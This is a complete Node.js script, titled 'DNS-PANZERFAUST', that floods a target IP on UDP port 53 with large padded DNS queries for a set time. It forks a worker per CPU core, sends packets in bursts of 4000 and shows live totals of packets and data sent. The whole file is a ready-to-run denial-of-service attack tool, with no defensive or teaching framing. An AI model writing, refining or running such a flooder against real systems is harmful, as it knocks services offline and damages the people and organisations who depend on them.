const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const port = 53;

if (!target || isNaN(duration)) {
  console.log('Usage: node dns-powerful-flood.js <target_ip> <duration_seconds>');
  process.exit(1);
}

const cpuCount = os.cpus().length;
const endTime = Date.now() + duration * 1000;
const payloadSize = 1400; // Large UDP packet close to MTU for max bandwidth

// Build a fake DNS query header + random payload to fill size
function buildDnsPayload() {
  const buf = Buffer.alloc(payloadSize);

  // DNS header (12 bytes)
  buf.writeUInt16BE(Math.floor(Math.random() * 0xffff), 0); // Transaction ID random
  buf.writeUInt16BE(0x0100, 2); // Standard query with recursion
  buf.writeUInt16BE(1, 4); // Questions = 1
  buf.writeUInt16BE(0, 6); // Answer RRs = 0
  buf.writeUInt16BE(0, 8); // Authority RRs = 0
  buf.writeUInt16BE(0, 10); // Additional RRs = 0

  // Query name: "example.com" in DNS format, padded to fill space
  const domain = 'example.com';
  let offset = 12;
  domain.split('.').forEach(label => {
    buf.writeUInt8(label.length, offset++);
    for (let i = 0; i < label.length; i++) {
      buf.writeUInt8(label.charCodeAt(i), offset++);
    }
  });
  buf.writeUInt8(0, offset++); // Terminate name

  // Query type A (1)
  buf.writeUInt16BE(1, offset);
  offset += 2;
  // Query class IN (1)
  buf.writeUInt16BE(1, offset);

  // Fill rest with random bytes for max payload size
  for (let i = offset + 2; i < payloadSize; i++) {
    buf[i] = Math.floor(Math.random() * 256);
  }

  return buf;
}

if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;

  console.clear();
  console.log('DNS-PANZERFAUST [POWERFUL UDP FLOOD]');
  console.log('--------------------------------------');
  console.log(`Target:          ${target}:${port}`);
  console.log(`Duration:        ${duration}s`);
  console.log(`Payload Size:    ${payloadSize} bytes`);
  console.log(`CPU Cores:       ${cpuCount}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        totalBytes += msg.bytes;
      }
    });
  }

  function formatNumber(n) {
    const units = ['', 'K', 'M', 'B', 'T'];
    let i = 0;
    while (n >= 1000 && i < units.length - 1) {
      n /= 1000;
      i++;
    }
    return `${n.toFixed(2)}${units[i]}`;
  }

  function formatBytes(bytes) {
    const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    let i = 0;
    while (bytes >= 1024 && i < units.length - 1) {
      bytes /= 1024;
      i++;
    }
    return `${bytes.toFixed(2)} ${units[i]}`;
  }

  setInterval(() => {
    console.clear();
    console.log('DNS-PANZERFAUST [POWERFUL UDP FLOOD]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent:  ${formatNumber(totalSent)}`);
    console.log(`Data Sent:           ${formatBytes(totalBytes)}`);
    console.log(`Target:              ${target}:${port}`);
    console.log(`Payload Size:        ${payloadSize} bytes`);
    console.log('--------------------------------------');
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const socket = dgram.createSocket('udp4');
  const payload = buildDnsPayload();
  let sent = 0;

  function spam() {
    function sendLoop() {
      if (Date.now() > endTime) return;

      // send bursts for max bandwidth & PPS
      for (let i = 0; i < 4000; i++) {
        socket.send(payload, 0, payload.length, port, target, (err) => {
          if (!err) sent++;
        });
      }
      setImmediate(sendLoop);
    }
    sendLoop();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes: sent * payloadSize });
    sent = 0;
  }, 1000);

  spam();
}
